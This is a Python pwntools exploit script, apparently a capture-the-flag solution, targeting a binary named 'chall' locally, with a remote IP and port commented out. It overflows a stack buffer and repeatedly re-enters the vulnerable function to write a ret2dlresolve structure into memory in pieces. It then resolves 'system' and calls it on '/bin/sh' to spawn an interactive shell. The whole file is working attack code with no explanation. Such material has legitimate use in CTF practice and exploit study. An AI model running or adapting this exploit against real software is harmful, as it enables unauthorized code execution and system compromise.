from pwn import *

context.binary = exe = ELF('./chall')
rop = ROP(exe)

p = process(exe.path)
#p = remote('183.91.11.30', 31337)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=[], data_addr = 0x404f00)
rop.ret2dlresolve(dlresolve)

offset = 0x20

log.info('Setup dlresolve address')
payload = b'i'*offset + p64(dlresolve.data_addr+0x20-0x30+40) + p64(exe.sym['vuln']+21)
p.send(payload)
log.info('Write address data')
time.sleep(1)
payload = b'i'*offset + p64(0x404a00) + p64(exe.sym['vuln']+21) + dlresolve.payload[40:64]
p.send(payload)
print(dlresolve.payload[40:64])

log.info('Setup dlresolve address')
time.sleep(1)
payload = b'i'*offset + p64(dlresolve.data_addr+0x20-0x30+16) + p64(exe.sym['vuln']+21)
p.send(payload)
log.info('Write address data')
time.sleep(1)
payload = b'i'*offset + p64(0x404a00) + p64(exe.sym['vuln']+21) + dlresolve.payload[16:40]
p.send(payload)
print(dlresolve.payload[16:40])

log.info('Setup dlresolve address')
time.sleep(1)
payload = b'i'*offset + p64(dlresolve.data_addr+0x20-0x30) + p64(exe.sym['vuln']+21)
p.send(payload)
log.info('Write address data')
time.sleep(1)
payload = b'i'*offset + p64(0x404a00) + p64(exe.sym['vuln']+21) + dlresolve.payload[0:16]
p.send(payload)

log.info('Setup binsh address')
time.sleep(1)
payload = b'i'*offset + p64(0x404e00+0x20) + p64(exe.sym['vuln']+21)
p.send(payload)
log.info('Dlresolve!')
time.sleep(1)
payload = b'/bin/sh\0'.ljust(offset, b'\0') + p64(0x404a00) + p64(pop_rdi) + p64(0x404e00) + rop.chain()
p.send(payload)

p.interactive()